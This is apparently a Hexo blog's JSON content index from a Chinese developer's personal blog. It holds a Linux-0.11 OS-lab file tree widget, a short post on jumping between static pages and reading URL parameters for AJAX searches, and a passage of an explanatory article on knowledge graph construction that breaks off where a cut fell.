{"meta":{"title":"欢迎来到匡盟盟的博客！","subtitle":"Colyn 崛起正当时！","description":"匡盟盟的个人博客！ | Mengmeng Kuang's Blog! 这个博客前几年用来记录作为程序员的我的一些开发技巧，未来几年，将重点关注研究，可能会写一些自我感想或者一些研究中的最新发现，欢迎大家评论。","author":"匡盟盟","url":"http://www.meng.uno"},"pages":[{"title":"关于我","date":"2018-04-17T04:47:34.246Z","updated":"2018-02-11T06:17:40.334Z","comments":true,"path":"about/index.html","permalink":"http://www.meng.uno/about/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-04-17T04:47:34.252Z","updated":"2018-02-11T06:17:12.723Z","comments":true,"path":"categories/index.html","permalink":"http://www.meng.uno/categories/index.html","excerpt":"","text":""},{"title":"留言板","date":"2018-04-17T04:47:34.209Z","updated":"2018-02-11T06:17:58.301Z","comments":true,"path":"comments/index.html","permalink":"http://www.meng.uno/comments/index.html","excerpt":"","text":""},{"title":"仓库","date":"2018-04-24T08:54:24.657Z","updated":"2018-04-24T08:54:24.544Z","comments":true,"path":"repository/index.html","permalink":"http://www.meng.uno/repository/index.html","excerpt":"","text":""},{"title":"照片墙","date":"2018-03-20T05:15:23.000Z","updated":"2018-03-20T05:17:07.126Z","comments":true,"path":"photos/index.html","permalink":"http://www.meng.uno/photos/index.html","excerpt":"","text":""},{"title":"标签云","date":"2018-04-24T08:54:10.518Z","updated":"2018-02-11T06:17:27.143Z","comments":true,"path":"tags/index.html","permalink":"http://www.meng.uno/tags/index.html","excerpt":"","text":""},{"title":"我的作品","date":"2018-04-17T04:47:34.247Z","updated":"2018-03-11T04:57:40.464Z","comments":true,"path":"works/index.html","permalink":"http://www.meng.uno/works/index.html","excerpt":"","text":""},{"title":"OS实验修改文件","date":"2018-04-17T04:47:34.246Z","updated":"2018-03-03T03:23:21.085Z","comments":true,"path":"utils/os.html","permalink":"http://www.meng.uno/utils/os.html","excerpt":"操作系统实验需要修改的文件 ——由操作系统MIC开发者提供！ 搜索 Search Tree: 展开节点 1 23 合上节点 展开一级 展开列表 1 23 合上列表 文件目录 操作过程","text":"操作系统实验需要修改的文件 .jq22-header { margin-bottom: 15px; font-family: \"Segoe UI\", \"Lucida Grande\", Helvetica, Arial, \"Microsoft YaHei\", FreeSans, Arimo, \"Droid Sans\", \"wenquanyi micro hei\", \"Hiragino Sans GB\", \"Hiragino Sans GB W3\", \"FontAwesome\", sans-serif; } .jq22-icon { color: #fff; } 操作系统实验需要修改的文件 ——由操作系统MIC开发者提供！ 搜索 Search Tree: 展开节点 1 2 3 合上节点 展开一级 展开列表 1 2 3 合上列表 文件目录 操作过程 $(function() { var defaultData = [{ text: 'Linux-0.11', href: '#linux-0.11', tags: ['10'], nodes: [{ text: 'MakeFile', href: '#MakeFile', tags: ['0'] }, { text: 'tags', href: '#tags', tags: ['0'] }, { text: 'boot', href: '#boot', tags: ['3'], nodes: [{ text: 'bootsect.s[实验一]', href: '#bootsect', tags: ['0'] }, { text: 'head.s', href: '#head', tags: ['0'] }, { text: 'setup.s[实验一]', href: '#setup', tags: ['0'] } ] }, { text: 'mm', href: '#mm', tags: ['3'], nodes: [{ text: 'Makefile', href: '#Makefile', tags: ['0'] }, { text: 'memory.c[实验五]', href: '#memory', tags: ['0'] }, { text: 'page.s', href: '#page', tags: ['0'] }, { text: 'shm.c{仅实验五}', href: '#shm', tags: ['0'] } ] }, { text: 'init', href: '#init', tags: ['1'], nodes: [{ text: 'main.c[实验三]', href: '#main', tags: ['0'] }] }, { text: 'tools', href: '#tools', tags: ['1'], nodes: [{ text: 'build.c', href: '#build', tags: ['0'] }] }, { text: 'fs', href: '#fs', tags: ['2'], nodes: [{ text: 'Makefile', href: '#fsMakefile', tags: ['0'] }, { text: '其余17个.c文件', href: '#fsc', tags: ['0'] } ] }, { text: 'lib', href: '#lib', tags: ['2'], nodes: [{ text: 'Makefile', href: '#libMakefile', tags: ['0'] }, { text: '其余12个.c文件', href: '#libc', tags: ['0'] } ] }, { text: 'include', href: '#include', tags: ['5'], nodes: [{ text: 'unistd.h[实验二、实验四、实验五]', href: '#includeuni', tags: ['0'] }, { text: '其余12个.h文件', href: '#includeh', tags: ['0'] }, { text: 'sys', href: '#sys', tags: ['1'], nodes: [{ text: '5个.h文件', href: '#includesysh', tags: ['0'] }] }, { text: 'linux', href: '#linux', tags: ['3'], nodes: [{ text: 'sys.h[实验四、实验五]', href: '#includesysh', tags: ['0'] }, { text: '其余9个.h文件', href: '#includelinuxh', tags: ['0'] }, { text: 'sched.h.curl', href: '#includelinuxhcurl', tags: ['0'] }, { text: 'sched.h.old', href: '#includelinuxhold', tags: ['0'] } ] }, { text: 'asm', href: '#asm', tags: ['4'], nodes: [{ text: 'io.h', href: '#asmio', tags: ['0'] }, { text: 'memory.h', href: '#memory', tags: ['0'] }, { text: 'segment.h', href: '#segment', tags: ['0'] }, { text: 'system.h[实验六]', href: '#system', tags: ['0'] } ] } ] }, { text: 'kernel', href: '#kernel', tags: ['15'], nodes: [{ text: 'Makefile[实验二、实验四、实验五]', href: '#kernelmakefile', tags: ['0'] }, { text: 'system_call.s[实验二、实验四、实验五]', href: '#kernelsyatem', tags: ['0'] }, { text: 'who.c{仅实验二}', href: '#kernelmakefile', tags: ['0'] }, { text: 'printk.c[实验三]', href: '#kernelpuc', tags: ['0'] }, { text: 'fork.c[实验三]', href: '#kernelforkc', tags: ['0'] }, { text: 'sched.c[实验三]', href: '#kernelsched', tags: ['0'] }, { text: 'exit.c[实验三]', href: '#kernelexit', tags: ['0'] }, { text: 'sem.c{仅实验四、实验五}', href: '#kernelexit', tags: ['0'] }, { text: '其余6个.c文件', href: '#kernelc', tags: ['0'] }, { text: '1个.s文件', href: '#kernels', tags: ['0'] }, { text: 'math', href: '#math', tags: ['2'], nodes: [{ text: 'Makefile', href: '#mathMakefile', tags: ['0'] }, { text: 'math-emulate.c', href: '#math-emulate', tags: ['0'] } ] }, { text: 'chr_drv', href: '#chrdrv', tags: ['3'], nodes: [{ text: 'Makefile', href: '#chrdrvMakefile', tags: ['0'] }, { text: 'keyboard.S[实验六]', href: '#keyboard', tags: ['0'] }, { text: 'keyboard.s', href: '#chrdrvs', tags: ['0'] }, { text: 'tty_io.c[实验六]', href: '#chrdrvc', tags: ['0'] }, { text: 'console.c[实验六]', href: '#chrdrvc', tags: ['0'] }, { text: '其余2个.c文件', href: '#chrdrvc', tags: ['0'] } ] }, { text: 'blk_drv', href: '#blkdrv', tags: ['3'], nodes: [{ text: 'Makefile', href: '#blkMakefile', tags: ['0'] }, { text: 'blk.h', href: '#blk', tags: ['0'] }, { text: '4个.c文件', href: '#blkc', tags: ['0'] } ] } ] }, { text: 'pc.c{仅实验四}', href: '#pcc', tags: ['0'] }, { text: 'producer.c{仅实验五}', href: '#pcc', tags: ['0'] }, { text: 'consumer.c{仅实验五}', href: '#pcc', tags: ['0'] }, { text: 'test.c{仅实验五}', href: '#ptesc', tags: ['0'] } ] }, { text: 'hdc', href: '#hdc', tags: ['4'], nodes: [{ text: 'usr', href: '#usr', tags: ['3'], nodes: [{ text: 'root', href: '#usrroot', tags: ['2'], nodes: [{ text: 'whoami.c{仅实验二}', href: '#usrrootwho', tags: ['0'] }, { text: 'iam.c{仅实验二}', href: '#usrrootiam', tags: ['0'] }, { text: 'process.c{仅实验三}', href: '#usrrootprocess', tags: ['0'] }, { text: 'pc.c{仅实验四}', href: '#usrrootpc', tags: ['0'] }, { text: 'producer.c{仅实验五}', href: '#pcc', tags: ['0'] }, { text: 'consumer.c{仅实验五}', href: '#pcc', tags: ['0'] } ] }, { text: 'include', href: '#usrinclude', tags: ['1'], nodes: [{ text: 'unistd.h[实验二、实验四、实验五]', href: '#usrrootunistd', tags: ['0'] }] } ] }] } ]; var $searchableTree = $('#treeview-searchable').treeview({ data: defaultData, }); var search = function(e) { var pattern = $('#input-search').val(); var options = { ignoreCase: $('#chk-ignore-case').is(':checked'), exactMatch: $('#chk-exact-match').is(':checked'), revealResults: $('#chk-reveal-results').is(':checked') }; var results = $searchableTree.treeview('search', [pattern, options]); var output = '' + results.length + ' matches found'; $.each(results, function(index, result) { output += '- ' + result.text + ''; }); $('#search-output').html(output); } $('#btn-search').on('click', search); $('#input-search').on('keyup', search); $('#btn-clear-search').on('click', function(e) { $searchableTree.treeview('clearSearch'); $('#input-search').val(''); $('#search-output').html(''); }); var initSelectableTree = function() { return $('#treeview-selectable').treeview({ data: defaultData, multiSelect: $('#chk-select-multi').is(':checked'), onNodeSelected: function(event, node) { $('#selectable-output').prepend('' + node.text + ' was selected'); }, onNodeUnselected: function(event, node) { $('#selectable-output').prepend('' + node.text + ' was unselected'); } }); }; var $selectableTree = initSelectableTree(); var findSelectableNodes = function() { return $selectableTree.treeview('search', [$('#input-select-node').val(), { ignoreCase: false, exactMatch: false }]); }; var selectableNodes = findSelectableNodes(); $('#chk-select-multi:checkbox').on('change', function() { console.log('multi-select change'); $selectableTree = initSelectableTree(); selectableNodes = findSelectableNodes(); }); // Select/unselect/toggle nodes $('#input-select-node').on('keyup', function(e) { selectableNodes = findSelectableNodes(); $('.select-node').prop('disabled', !(selectableNodes.length >= 1)); }); $('#btn-select-node.select-node').on('click', function(e) { $selectableTree.treeview('selectNode', [selectableNodes, { silent: $('#chk-select-silent').is(':checked') }]); }); $('#btn-unselect-node.select-node').on('click', function(e) { $selectableTree.treeview('unselectNode', [selectableNodes, { silent: $('#chk-select-silent').is(':checked') }]); }); $('#btn-toggle-selected.select-node').on('click', function(e) { $selectableTree.treeview('toggleNodeSelected', [selectableNodes, { silent: $('#chk-select-silent').is(':checked') }]); }); var $expandibleTree = $('#treeview-expandible').treeview({ data: defaultData, onNodeCollapsed: function(event, node) { $('#expandible-output').prepend('' + node.text + ' 节点被合上！'); }, onNodeExpanded: function(event, node) { $('#expandible-output').prepend('' + node.text + ' 节点被展开！'); } }); var findExpandibleNodess = function() { return $expandibleTree.treeview('search', [$('#input-expand-node').val(), { ignoreCase: false, exactMatch: false }]); }; var expandibleNodes = findExpandibleNodess(); // Expand/collapse/toggle nodes $('#input-expand-node').on('keyup', function(e) { expandibleNodes = findExpandibleNodess(); $('.expand-node').prop('disabled', !(expandibleNodes.length >= 1)); }); $('#btn-expand-node.expand-node').on('click', function(e) { var levels = $('#select-expand-node-levels').val(); $expandibleTree.treeview('expandNode', [expandibleNodes, { levels: levels, silent: $('#chk-expand-silent').is(':checked') }]); }); $('#btn-collapse-node.expand-node').on('click', function(e) { $expandibleTree.treeview('collapseNode', [expandibleNodes, { silent: $('#chk-expand-silent').is(':checked') }]); }); $('#btn-toggle-expanded.expand-node').on('click', function(e) { $expandibleTree.treeview('toggleNodeExpanded', [expandibleNodes, { silent: $('#chk-expand-silent').is(':checked') }]); }); // Expand/collapse all $('#btn-expand-all').on('click', function(e) { var levels = $('#select-expand-all-levels').val(); $expandibleTree.treeview('expandAll', { levels: levels, silent: $('#chk-expand-silent').is(':checked') }); }); $('#btn-collapse-all').on('click', function(e) { $expandibleTree.treeview('collapseAll', { silent: $('#chk-expand-silent').is(':checked') }); }); var $checkableTree = $('#treeview-checkable').treeview({ data: defaultData, showIcon: false, showCheckbox: true, onNodeChecked: function(event, node) { $('#checkable-output').prepend('' + node.text + ' was checked'); }, onNodeUnchecked: function(event, node) { $('#checkable-output').prepend('' + node.text + ' was unchecked'); } }); var findCheckableNodess = function() { return $checkableTree.treeview('search', [$('#input-check-node').val(), { ignoreCase: false, exactMatch: false }]); }; var checkableNodes = findCheckableNodess(); // Check/uncheck/toggle nodes $('#input-check-node').on('keyup', function(e) { checkableNodes = findCheckableNodess(); $('.check-node').prop('disabled', !(checkableNodes.length >= 1)); }); $('#btn-check-node.check-node').on('click', function(e) { $checkableTree.treeview('checkNode', [checkableNodes, { silent: $('#chk-check-silent').is(':checked') }]); }); $('#btn-uncheck-node.check-node').on('click', function(e) { $checkableTree.treeview('uncheckNode', [checkableNodes, { silent: $('#chk-check-silent').is(':checked') }]); }); $('#btn-toggle-checked.check-node').on('click', function(e) { $checkableTree.treeview('toggleNodeChecked', [checkableNodes, { silent: $('#chk-check-silent').is(':checked') }]); }); // Check/uncheck all $('#btn-check-all').on('click', function(e) { $checkableTree.treeview('checkAll', { silent: $('#chk-check-silent').is(':checked') }); }); $('#btn-uncheck-all').on('click', function(e) { $checkableTree.treeview('uncheckAll', { silent: $('#chk-check-silent').is(':checked') }); }); var $disabledTree = $('#treeview-disabled').treeview({ data: defaultData, onNodeDisabled: function(event, node) { $('#disabled-output').prepend('' + node.text + ' was disabled'); }, onNodeEnabled: function(event, node) { $('#disabled-output').prepend('' + node.text + ' was enabled'); }, onNodeCollapsed: function(event, node) { $('#disabled-output').prepend('' + node.text + ' was collapsed'); }, onNodeUnchecked: function(event, node) { $('#disabled-output').prepend('' + node.text + ' was unchecked'); }, onNodeUnselected: function(event, node) { $('#disabled-output').prepend('' + node.text + ' was unselected'); } }); var findDisabledNodes = function() { return $disabledTree.treeview('search', [$('#input-disable-node').val(), { ignoreCase: false, exactMatch: false }]); }; var disabledNodes = findDisabledNodes(); // Expand/collapse/toggle nodes $('#input-disable-node').on('keyup', function(e) { disabledNodes = findDisabledNodes(); $('.disable-node').prop('disabled', !(disabledNodes.length >= 1)); }); $('#btn-disable-node.disable-node').on('click', function(e) { $disabledTree.treeview('disableNode', [disabledNodes, { silent: $('#chk-disable-silent').is(':checked') }]); }); $('#btn-enable-node.disable-node').on('click', function(e) { $disabledTree.treeview('enableNode', [disabledNodes, { silent: $('#chk-disable-silent').is(':checked') }]); }); $('#btn-toggle-disabled.disable-node').on('click', function(e) { $disabledTree.treeview('toggleNodeDisabled', [disabledNodes, { silent: $('#chk-disable-silent').is(':checked') }]); }); // Expand/collapse all $('#btn-disable-all').on('click', function(e) { $disabledTree.treeview('disableAll', { silent: $('#chk-disable-silent').is(':checked') }); }); $('#btn-enable-all').on('click', function(e) { $disabledTree.treeview('enableAll', { silent: $('#chk-disable-silent').is(':checked') }); }); var $tree = $('#treeview12').treeview({ data: json }); });"}],"posts":[{"title":"静态前端页面向静态前端页面跳转并执行AJAX操作将数据写入跳入界面","slug":"front2front","date":"2018-08-15T14:09:21.000Z","updated":"2018-08-15T14:27:45.054Z","comments":true,"path":"articles/2b207973/","link":"","permalink":"http://www.meng.uno/articles/2b207973/","excerpt":"在暑假进行的项目 医疗文本处理平台 中，我需要将队友的Ajax写好的功能整合到我的界面上，因为他之前是一个界面，而我想做成像搜索引擎那种，在一个页面上输入搜索词，跳转到另一个页面显示结果（后跳转界面还可以继续通过Ajax获得新的搜索结果） 在这里将前一个页面命名为A，后一个为B（什么文件格式不重要，只要是静态页面就成）。 A中的JavaScript代码 1 2 3 4 5 6 7 8 9 10 11 12 13 function jumpOnClick(flag) { url = \"section3_2.j","text":"在暑假进行的项目 医疗文本处理平台 中，我需要将队友的Ajax写好的功能整合到我的界面上，因为他之前是一个界面，而我想做成像搜索引擎那种，在一个页面上输入搜索词，跳转到另一个页面显示结果（后跳转界面还可以继续通过Ajax获得新的搜索结果） 在这里将前一个页面命名为A，后一个为B（什么文件格式不重要，只要是静态页面就成）。 A中的JavaScript代码 12345678910111213 &lt;script type=&quot;text/javascript&quot;&gt; function jumpOnClick(flag) &#123; url = &quot;section3_2.jsp?text=&quot; + encodeURIComponent(document.getElementById(&apos;search&apos;).value) + &quot;&amp;flag=&quot; + flag; if(document.getElementById(&apos;search&apos;).value.match(&quot;\\\\s+&quot;) || document.getElementById(&apos;search&apos;).value == null || document.getElementById(&apos;search&apos;).value == &quot;&quot;)&#123; alert(&quot;请输入症状或问题后点击相应查询按钮！&quot;); return; &#125; //网页跳转 location.href = url; window.event.returnValue=false; &#125; &lt;/script&gt; 在A中，我将调用放到了按钮的onclick中。 B中的JavaScript代码 123456789101112131415161718192021222324252627282930 &lt;script type=&quot;text/javascript&quot;&gt; function GetUrlParam() &#123; var url = document.location.toString(); var arrObj = url.split(&quot;?&quot;); var text,flag; if (arrObj.length &gt; 1) &#123; var arrPara = arrObj[1].split(&quot;&amp;&quot;); var arr; for (var i = 0; i &lt; arrPara.length; i++) &#123; arr = arrPara[i].split(&quot;=&quot;); if (arr != null &amp;&amp; arr[0] == &quot;text&quot;) &#123; text = decodeURIComponent(arr[1]); flag = 0; if(text == &quot;&quot; || text == null)&#123; return; &#125; var psel = document.getElementById(&quot;kw&quot;); psel.value = text; //设置 &#125;else if(arr != null &amp;&amp; arr[0] == &quot;flag&quot;)&#123; flag = arr[1]; &#125; &#125; if(flag == 1)&#123; searchOnClick(text); &#125;else if(flag == 2)&#123; search2OnClick(text); &#125; &#125; &#125;&lt;/script&gt; 在B中，我将调用放到了body的onload中。 至此完成上述功能，并且保证了在后跳入页面上刷新时，不会因为保留了跳入内容而无法刷新的情况。 本文链接： http://www.meng.uno/articles/2b207973/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"},{"name":"Web","slug":"Web","permalink":"http://www.meng.uno/tags/Web/"},{"name":"Ajax","slug":"Ajax","permalink":"http://www.meng.uno/tags/Ajax/"}]},{"title":"知识图谱（Knowledge Graph）","slug":"KnowledgeGraph","date":"2018-08-07T07:05:54.000Z","updated":"2018-08-07T07:14:42.943Z","comments":true,"path":"articles/349dc05d/","link":"","permalink":"http://www.meng.uno/articles/349dc05d/","excerpt":"简介 近两年来，随着Linking Open Data等项目的全面展开，语义Web数据源的数量激增，大量RDF数据被发布。互联网正从仅包含网页和网页之间超链接的文档万维网(Document Web)转变成包含大量描述各种实体和实体之间丰富关系的数据万维网(Data Web)。在这个背景下，Google、百度和搜狗等搜索引擎公司纷纷以此为基础构建知识图谱，分别为Knowledge Graph、知心和知立方，来改进搜索质量，从而拉开了语义搜索的序幕。下面我将从以下几个方面来介绍知识图谱：知识图谱的表示和在搜索中的展现形式，知识图谱的构建和知识图谱在搜索中的应用等，从而让大家有机会了解其内部的技术实","text":"简介 近两年来，随着Linking Open Data等项目的全面展开，语义Web数据源的数量激增，大量RDF数据被发布。互联网正从仅包含网页和网页之间超链接的文档万维网(Document Web)转变成包含大量描述各种实体和实体之间丰富关系的数据万维网(Data Web)。在这个背景下，Google、百度和搜狗等搜索引擎公司纷纷以此为基础构建知识图谱，分别为Knowledge Graph、知心和知立方，来改进搜索质量，从而拉开了语义搜索的序幕。下面我将从以下几个方面来介绍知识图谱：知识图谱的表示和在搜索中的展现形式，知识图谱的构建和知识图谱在搜索中的应用等，从而让大家有机会了解其内部的技术实现和各种挑战。 知识图谱的表示和在搜索中的展现形式 正如Google的辛格博士在介绍知识图谱时提到的：“The world is not made of strings , but is made of things.”，知识图谱旨在描述真实世界中存在的各种实体或概念。其中，每个实体或概念用一个全局唯一确定的ID来标识，称为它们的标识符(identifier)。每个属性-值对(attribute-value pair，又称AVP)用来刻画实体的内在特性，而关系(relation)用来连接两个实体，刻画它们之间的关联。知识图谱亦可被看作是一张巨大的图，图中的节点表示实体或概念，而图中的边则由属性或关系构成。上述图模型可用W3C提出的资源描述框架RDF[2] 或属性图(property graph)[3] 来表示。知识图谱率先由Google提出，以提高其搜索的质量。 为了更好地理解知识图谱，我们先来看一下其在搜索中的展现形式，即知识卡片(又称Knowledge Card)。知识卡片旨在为用户提供更多与搜索内容相关的信息。更具体地说，知识卡片为用户查询中所包含的实体或返回的答案提供详细的结构化摘要。从某种意义来说，它是特定于查询(query specific)的知识图谱。例如，当在搜索引擎中输入“姚明”作为关键词时，我们发现搜索结果页面的右侧原先用于置放广告的地方被知识卡片所取代。广告被移至左上角，而广告下面则显示的是传统的搜索结果，即匹配关键词的文档列表。这个布局上的微调也预示着各大搜索引擎在提高用户体验和直接返回答案方面的决心。 相关名词解释 Knowledge Base：通常翻译为“知识库”。知识库是人工智能的经典概念之一。最早是作为专家系统（Expert System）的组成部分，用于支持推理。知识库中的知识有很多种不同的形式，例如本体知识、关联性知识、规则库、案例知识等。相比于知识库的概念，知识图谱更加侧重关联性知识的构建，如三元组。 The Semantic Web ：通常翻译为“语义网”或“语义互联网”，是Web之父Tim Berners Lee于1998年提出的【1】。语义互联网的核心内涵是：Web不仅仅要通过超链接把文本页面链接起来，还应该把事物链接起来，使得搜索引擎可以直接对事物进行搜索，而不仅仅是对网页进行搜索。谷歌知识图谱是语义互联网这一理念的商业化实现。也可以把语义互联网看做是一个基于互联网共同构建的全球知识库。 Linked Data：通常翻译为“链接数据”。是Tim Berners Lee于2006年提出，是为了强调语义互联网的目的是要建立数据之间的链接，而非仅仅是把结构化的数据发布到网上。他为建立数据之间的链接制定了四个原则。从理念上讲，链接数据最接近于知识图谱的概念。但很多商业知识图谱的具体实现并不一定完全遵循Tim所提出的那四个原则。 Semantic Net/ Semantic Network：通常翻译为“语义网络”或“语义网”，这个翻译通常被与Semantic Web的翻译混淆起来，为了以示区别，这里采用“语义网络”的翻译。语义网络最早是1960年由认知科学家Allan M. Collins作为知识表示的一种方法提出。WordNet是最典型的语义网络。相比起知识图谱，早期的语义网络更加侧重描述概念以及概念之间的关系，而知识图谱更加强调数据或事物之间的链接。 Ontology：通常翻译为“本体”。本体本身是个哲学名词。在上个世纪80年代，人工智能研究人员将这一概念引入了计算机领域。Tom Gruber把本体定义为“概念和关系的形式化描述”。通俗点讲，本体相似于数据库中的Schema，主要用来定义类和关系，以及类层次和关系层次等。OWL是最常用的本体描述语言。本体通常被用来为知识图谱定义Schema。 通过上述的介绍，大家应该对知识图谱的表示以及其在搜索中的展现形式有了更深的了解。接着，我将介绍知识图谱的构建以及如何在搜索中应用知识图谱返回相应的知识卡片以及答案。 知识图谱的构建 知识图谱的规模 据不完全统计，Google知识图谱到目前为止包含了5亿个实体和35亿条事实(形如实体-属性-值，和实体-关系-实体)。其知识图谱是面向全球的，因此包含了实体和相关事实的多语言描述。不过相比占主导的英语外，仅包含其他语言(如中文)的知识图谱的规模则小了很多。与此不同的是，百度和搜狗主要针对中文搜索推出知识图谱，其知识库中的知识也主要以中文来描述，其规模略小于Google的。 知识图谱的数据来源 为了提高搜索质量，特别是提供如对话搜索和复杂问答等新的搜索体验，我们不仅要求知识图谱包含大量高质量的常识性知识，还要能及时发现并添加新的知识。在这种背景下，知识图谱通过收集来自百科类站点和各种垂直站点的结构化数据来覆盖大部分常识性知识。这些数据普遍质量较高，更新比较慢。而另一方面，知识图谱通过从各种半结构化数据(形如HTML表格)抽取相关实体的属性-值对来丰富实体的描述。此外，通过搜索日志(query log)发现新的实体或新的实体属性从而不断扩展知识图谱的覆盖率。相比高质量的常识性知识，通过数据挖掘抽取得到的知识数据更大，更能反映当前用户的查询需求并能及时发现最新的实体或事实，但其质量相对较差，存在一定的错误。这些知识利用互联网的冗余性在后续的挖掘中通过投票或其他聚合算法来评估其置信度，并通过人工审核加入到知识图谱中。 百科类数据 维基百科，通过协同编辑，已经成为最大的在线百科全书，其质量与大英百科媲美。可以通过以下方式来从维基百科中获取所需的内容：通过文章页面(Article Page)抽取各种实体;通过重定向页面(Redirect Page)获得这些实体的同义词(又称Synonym);通过去歧义页面(Disambiguation Page)和内链锚文本(Internal Link Anchor Text)获得它们的同音异义词(又称Homonym);通过概念页面(Category Page)获得各种概念以及其上下位(subclass)关系;通过文章页面关联的开放分类抽取实体所对应的类别;通过信息框(Infobox)抽取实体所对应的属性-值对和关系-实体对。类似地，从百度百科和互动百科抽取各种中文知识来弥补维基百科中文数据不足的缺陷。此外，Freebase[5] 是另一个重要的百科类的数据源，其包含超过3900万个实体(其称为Topics)和18亿条事实，规模远大于维基百科。对比之前提及的知识图谱的规模，我们发现仅Freebase一个数据源就构成了Google知识图谱的半壁江山。更为重要的是，维基百科所编辑的是各种词条，这些词条以文章的形式来展现，包含各种半结构化信息，需要通过事先制定的规则来抽取知识;而Freebase则直接编辑知识，包括实体及其包含的属性和关系，以及实体所属的类型等结构化信息。因此，不需要通过任何抽取规则即可获得高质量的知识。虽然开发Freebase的母公司MetaWeb于2010年被Google收购，Freebase还是作为开放的知识管理平台独立运行。所以百度和搜狗也将Freebase加入到其知识图谱中。 结构化数据 除了百科类的数据，各大搜索引擎公司在构建知识图谱时，还考虑其他结构化数据。其中，LOD项目在发布各种语义数据的同时，通过owl:sameAs将新发布的语义数据中涉及的实体和LOD中已有数据源所包含的潜在同一实体进行关联，从而实现了手工的实体对齐(entity alignment)。LOD不仅包括如DBpedia和YAGO等通用语义数据集，还包括如MusicBrainz和DrugBank等特定领域的知识库。因此，Google等通过整合LOD中的(部分)语义数据提高知识的覆盖率，尤其是垂直领域的各种知识。此外，Web上存在大量高质量的垂直领域站点(如电商网站，点评网站等)，这些站点被称为Deep Web。它们通过动态网页技术将保存在数据库中的各种领域相关的结构化数据以HTML表格的形式展现给用户。各大搜索引擎公司通过收购这些站点或购买其数据来进一步扩充其知识图谱在特定领域的知识。 这样做出于三方面原因： 大量爬取这些站点的数据会占据大量带宽，导致这些站点无法被正常访问; 爬取全站点数据可能会涉及知识产权纠纷; 相比静态网页的爬取，Deep Web爬虫需要通过表单填充(Form Filling)技术来获取相关内容，且解析这些页面中包含的结构化信息需要额外的自动化抽取算法，具体细节在下一节描述。 半结构化数据挖掘AVP 虽然从Deep Web爬取数据并解析其中所包含的结构化信息面临很大的挑战，各大搜索引擎公司仍在这方面投入了大量精力。一方面，Web上存在大量长尾的结构化站点，这些站点提供的数据与最主流的相关领域站点所提供的内容具有很强的互补性，因此对这些长尾站点进行大规模的信息抽取(尤其是实体相关的属性-值对的抽取)对于知识图谱所含内容的扩展是非常有价值的。另一方面，中文百科类的站点(如百度百科等)的结构化程度远不如维基百科，能通过信息框获得AVP的实体非常稀少，大量属性-值对隐含在一些列表或表格中。一个切实可行的做法是构建面向站点的包装器(Site-specific Wrapper)。其背后的基本思想是：**一个Deep Web站点中的各种页面由统一的程序动态生成，具有类似的布局和结构。**利用这一点，我们仅需从当前待抽取站点采样并标注几个典型详细页面(Detailed Pages)，利用这些页面通过模式学习算法(Pattern Learning)自动构建出一个或多个以类Xpath表示的模式，然后将其应用在该站点的其他详细页面中从而实现自动化的AVP抽取。对于百科类站点，我们可以将具有相同类别的页面作为某个“虚拟”站点，并使用类似的方法进行实体AVP的抽取。自动学习获得的模式并非完美，可能会遗漏部分重要的属性，也可能产生错误的抽取结果。为了应对这个问题，搜索引擎公司往往通过构建工具来可视化这些模式，并人工调整或新增合适的模式用于抽取。此外，通过人工评估抽取的结果，将那些抽取结果不令人满意的典型页面进行再标注来更新训练样本，从而达到主动学习(Active Learning)的目的。 通过搜索日志进行实体和实体属性等挖掘 搜索日志是搜索引擎公司积累的宝贵财富。一条搜索日志形如**&lt;查询，点击的页面链接，时间戳&gt;**。通过挖掘搜索日志，我们往往可以发现最新出现的各种实体及其属性，从而保证知识图谱的实时性。这里侧重于从查询的关键词短语和点击的页面所对应的标题中抽取实体及其属性。选择查询作为抽取目标的意义在于其反映了用户最新最广泛的需求，从中能挖掘出用户感兴趣的实体以及实体对应的属性。而选择页面的标题作为抽取目标的意义在于标题往往是对整个页面的摘要，包含最重要的信息。据百度研究者的统计，90%以上的实体可以在网页标题中被找到。为了完成上述抽取任务，一个常用的做法是：针对每个类别，挑选出若干属于该类的实体(及相关属性)作为种子(Seeds)，找到包含这些种子的查询和页面标题，形成正则表达式或文法模式。这些模式将被用于抽取查询和页面标题中出现的其他实体及其属性。如果当前抽取所得的实体未被包含在知识图谱中，则该实体成为一个新的候选实体。类似地，如果当前被抽取的属性未出现在知识图谱中，则此属性成为一个新的候选属性。这里，我们仅保留置信度高的实体及其属性，新增的实体和属性将被作为新的种子发现新的模式。此过程不断迭代直到没有新的种子可以加入或所有的模式都已经找到且无法泛化。在决定模式的好坏时，常用的基本原则是尽量多地发现属于当前类别的实体和对应属性，尽量少地抽取出属于其他类别的实体及属性。上述方法被称为基于Bootstrapping的多类别协同模式学习。 从抽取图谱到知识图谱 上述所介绍的方法仅仅是从各种类型的数据源抽取构建知识图谱所需的各种候选实体(概念)及其属性关联，形成了一个个孤立的抽取图谱(Extraction Graphs)。为了形成一个真正的知识图谱，我们需要将这些信息孤岛集成在一起。下面我对知识图谱挖掘所涉及的重要技术点逐一进行介绍。 实体对齐 实体对齐(Object Alignment)旨在发现具有不同ID但却代表真实世界中同一对象的那些实体，并将这些实体归并为一个具有全局唯一标识的实体对象添加到知识图谱中。虽然实体对齐在数据库领域被广泛研究，但面对如此多异构数据源上的Web规模的实体对齐，这还是第一次尝试。各大搜索引擎公司普遍采用的方法是聚类。聚类的关键在于定义合适的相似度度量。这些相似度度量遵循如下观察：具有相同描述的实体可能代表同一实体(字符相似);具有相同属性-值的实体可能代表相同对象(属性相似);具有相同邻居的实体可能指向同一个对象(结构相似)。在此基础上，为了解决大规模实体对齐存在的效率问题，各种基于数据划分或分割的算法被提出将实体分成一个个子集，在这些子集上使用基于更复杂的相似度计算的聚类并行地发现潜在相同的对象。另外，利用来自如LOD中已有的对齐标注数据(使用owl:sameAs关联两个实体)作为训练数据，然后结合相似度计算使用如标签传递(Label Propagation)等基于图的半监督学习算法发现更多相同的实体对。无论何种自动化方法都无法保证100%的准确率，所以这些方法的产出结果将作为候选供人工进一步审核和过滤。 知识图谱schema构建 在之前的技术点介绍中，大部分篇幅均在介绍知识图谱中数据层(Data Level)的构建，而没有过多涉及模式层(Schema 